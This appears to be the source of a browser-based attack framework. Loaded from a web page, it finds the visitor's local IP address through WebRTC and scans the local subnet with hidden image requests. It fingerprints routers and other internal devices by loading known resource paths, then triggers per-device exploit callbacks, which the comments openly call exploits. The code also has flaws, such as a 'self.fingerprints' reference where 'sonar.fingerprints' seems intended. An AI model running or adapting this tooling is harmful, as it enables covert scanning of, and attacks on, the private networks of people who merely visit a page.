var sonar = {
    'fingerprints': [],
    'internal_hosts': {},

    /*
     * Start the exploit
     */
    'start': function() {
        if( sonar.fingerprints.length == 0 ) {
            return false;
        }

        sonar.scan_for_ips( function( ip ) {
            sonar.identify_device( ip );
        });
    },

    /*
     * Take enumerated IP addresses and run through the fingerprints to identify the devices.
     */
    'identify_device': function( ip ) {
        sonar.fingerprints.forEach( function( fingerprint, index, all ) {
            for( i = 0; i < fingerprint.fingerprints.length; i++ ) {
                sonar.check_resource_exists( fingerprint.fingerprints[i], sonar.internal_host_manager, ip );
            }
        });
    },

    /*
     * This function keeps the records for what resources have been mapped to which hosts.
     */
    'internal_host_manager': function( ip, path ) {
        if( sonar.internal_hosts[ ip ] === undefined ) {
            sonar.internal_hosts[ ip ] = [];
        }

        // Add newly enumerate resource to host map
        if ( sonar.internal_hosts[ ip ].indexOf( path ) == -1 ) {
            sonar.internal_hosts[ ip ].push( path );
        }

        // Check to see if any of the fingerprints match, if so start the exploit!
        sonar.check_matches();
    },

    /*
     * Check if there are any fingerprint matches, if so call the respective function to start the exploit.
     */
    'check_matches': function() {
        for( var index in sonar.internal_hosts ) {
            sonar.internal_hosts[ index ].sort();
            self.fingerprints.forEach( function( fingerprint ) {
                fingerprint.fingerprints.sort();
                if( fingerprint.fingerprints.equals( sonar.internal_hosts[ index ]) ) {
                    // Check to see if this fingerprint has been triggered before. Prevents double triggers.
                    if( fingerprint.called === undefined ) {
                        fingerprint.called = [];
                    }

                    if ( fingerprint.called.indexOf( index ) == -1 ) {
                        fingerprint.called.push( index );
                        fingerprint.callback( index );
                    }
                }
            });
        }
    },

    /*
     * Browser fingerprints are loaded here
     *
     * Fingerprints are just arrays of resources such as images, css, and javascript that can be enumerated via external resource onload.
     * By checking for the existance of these resources we can identify routers and other internal devices and launch appropriate exploits.
     *
     * Example fingerprint data structure:
     * var fingerprints = [
     *  {
     *      'name': 'ASUS RT N66U Exploit',
     *      'fingerprints': [ '/other.css' ],
     *      'callback': function( ip ),
     *  }
     * ]
     *
     */
    'load_fingerprints': function( fingerprints ) {
        sonar.fingerprints = fingerprints;
    },

    /*
     * WebRTC Scanner Code
     * Some of the below code is taken from https://dl.dropboxusercontent.com/u/1878671/enumhosts.html
     * All credit given to them for a nice way to enumerate internal hosts :)
     * See also: https://hacking.ventures/local-ip-discovery-with-html5-webrtc-security-and-privacy-risk/
     */
    'scan_for_ips': function( callback ) {
        var q = new TaskController(1);
        sonar.enumerate_local_ips( function( localIp ) {
            q.queue( function( cb ) {
                sonar.probe_network( localIp,
                     function( ip ) {
                         callback( ip );
                     },
                 cb);
            });
        });
    },

    'probe_ip': function(ip, timeout, cb) {
        var start = Date.now();
        var done = false;
        var img = document.createElement('img');
        var clean = function() {
            if (!img) return;
            document.body.removeChild(img);
            img = null;
        };
        var onResult = function(success) {
            if (done) return;
            done = true;
            clean();
            cb(ip, Date.now() - start < timeout);
        };
        document.body.appendChild(img);
        img.style.display = 'none';
        img.onload = function() { onResult(true); };
        img.onerror = function() { onResult(false); };
        img.src = 'https://' + ip + ':' + ~~(1024+1024*Math.random()) + '/' + sonar.generate_random_id() + '?' + Math.random();
        setTimeout(function() { if (img) img.src = ''; }, timeout + 500);
    },

    'probe_network': function(net, onHostFound, onDone) {
        net = net.replace(/(\d+\.\d+\.\d+)\.\d+/, '$1.');
        var timeout = 5000;
        var done = false;
        var found = [];
        var q = new TaskController(5, onDone);
        for (var i = 1; i < 256; ++i) {
            q.queue((function(i, cb) {
                sonar.probe_ip(net + i, timeout, function(ip, success) {
                    if (success) onHostFound(ip);
                    cb();
                });
            }).bind(this, i));
        }
    },

    'enumerate_local_ips': function(cb) {
        var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (!RTCPeerConnection) return false;
        var addrs = Object.create(null);
        addrs['0.0.0.0'] = false;
        function addAddress(newAddr) {
            if (newAddr in addrs) return;
            addrs[newAddr] = true;
            cb(newAddr);
        }
        function grepSDP(sdp) {
            var hosts = [];
            sdp.split('\r\n').forEach(function (line) {
                if (~line.indexOf('a=candidate')) {
                    var parts = line.split(' '),
                        addr = parts[4],
                        type = parts[7];
                    if (type === 'host') addAddress(addr);
                } else if (~line.indexOf('c=')) {
                    var parts = line.split(' '),
                        addr = parts[2];
                    addAddress(addr);
                }
            });
        }
        var rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('', {reliable:false});
        rtc.onicecandidate = function (evt) {
            if (evt.candidate) grepSDP('a='+evt.candidate.candidate);
        };
        setTimeout(function() {
            rtc.createOffer(function (offerDesc) {
                grepSDP(offerDesc.sdp);
                rtc.setLocalDescription(offerDesc);
            }, function (e) {});
        }, 500);
        return true;
    },

    'generate_random_id': function() {
        function s4() {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
    },

    /*
     * Internal host fingerprinting via SOP hacks
     */
    'check_resource_exists': function( resource, callback, ip ) {
        var full_source = 'http://' + ip + resource;
        var element_id = sonar.generate_random_id();
        if( resource.toLowerCase().endsWith( '.css' ) ) {
            var resourceref = document.createElement( "link" );
            resourceref.setAttribute( "id", element_id );
            resourceref.setAttribute( "type", "text/css" );
            resourceref.setAttribute( "rel", "stylesheet" );
            resourceref.setAttribute( "href", full_source );

            resourceref.addEventListener( "load", function( event ) {
                sonar.internal_host_manager( ip, resource );
            }, false );
            document.getElementsByTagName("head")[0].appendChild( resourceref );
        } else if ( resource.toLowerCase().endsWith( '.png' ) || resource.endsWith( '.gif') || resource.endsWith( '.jpg' ) || resource.endsWith( '.tiff' ) ) {
            var resourceref = document.createElement( "img" );
            resourceref.setAttribute( "id", element_id );
            resourceref.setAttribute( "src", full_source );

            resourceref.addEventListener( "load", function( event ) {
                sonar.internal_host_manager( ip, resource );
            }, false );
            document.getElementsByTagName("head")[0].appendChild( resourceref );
        } else if ( resource.toLowerCase().endsWith( '.js' ) ) {
            var resourceref = document.createElement( "script" );
            resourceref.setAttribute( "id", "testresource" );
            resourceref.setAttribute( "src", full_source );

            resourceref.addEventListener( "load", function( event ) {
                sonar.internal_host_manager( ip, resource );
            }, false );
            document.getElementsByTagName("head")[0].appendChild( resourceref );
        } else {
            // Not a detectable resource
        }

        // Remove the element after a set amount of time to ensure they're killed
        setTimeout( function() {
            document.getElementById( element_id ).remove();
        }, 5000 );
    },
}

// Monkey patching JavaScript
function TaskController(numConcurrent, onDone) {
    this.numConcurrent = numConcurrent;
    this.onDone = onDone || function() {};
    this.pending = 0;
    this.queued = [];
    this.checkTimer = -1;
}

TaskController.prototype.deferCheck = function() {
    if (this.checkTimer != -1) return;
    this.checkTimer = setTimeout((function() {
        this.checkTimer = -1;
        this.check();
    }).bind(this), 0);
};

Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}

NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
    for(var i = 0, len = this.length; i < len; i++) {
        if(this[i] && this[i].parentElement) {
            this[i].parentElement.removeChild(this[i]);
        }
    }
}

Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}

TaskController.prototype.check = function() {
    if (this.pending < 1 && this.queued.length == 0) return this.onDone();
    while (this.pending < this.numConcurrent && this.queued.length > 0) {
        try {
            this.pending += 1;
            setTimeout((function(task) {
                task((function() {
                    this.pending -= 1;
                    this.deferCheck();
                }).bind(this));
            }).bind(this, this.queued.shift()), 0);
        }
        catch (e) {
            this.pending -= 1;
            this.deferCheck();
        }
    }
};

TaskController.prototype.queue = function(task) {
    this.queued.push(task);
    this.deferCheck();
};

Array.prototype.contains = function(obj) {
    var i = this.length;
    while (i--) {
        if (this[i] === obj) {
            return true;
        }
    }
    return false;
}

Array.prototype.equals = function (array) {
    if (!array)
        return false;

    if (this.length != array.length)
        return false;

    for (var i = 0, l=this.length; i < l; i++) {
        if (this[i] instanceof Array && array[i] instanceof Array) {
            if (!this[i].equals(array[i]))
                return false;
        }
        else if (this[i] != array[i]) {
            return false;
        }
    }
    return true;
}
